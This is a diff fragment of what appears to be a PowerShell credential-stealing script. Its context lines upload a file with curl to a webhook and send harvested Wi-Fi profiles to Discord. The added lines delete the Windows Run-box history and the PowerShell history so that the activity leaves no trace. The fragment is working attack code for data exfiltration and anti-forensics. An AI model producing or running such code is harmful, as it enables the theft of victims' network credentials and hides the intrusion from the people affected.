@@ -26,3 +26,13 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "Ita: $wifiProfiles_IT"}
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "Eng: $wifiProfiles_EN"}
+
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
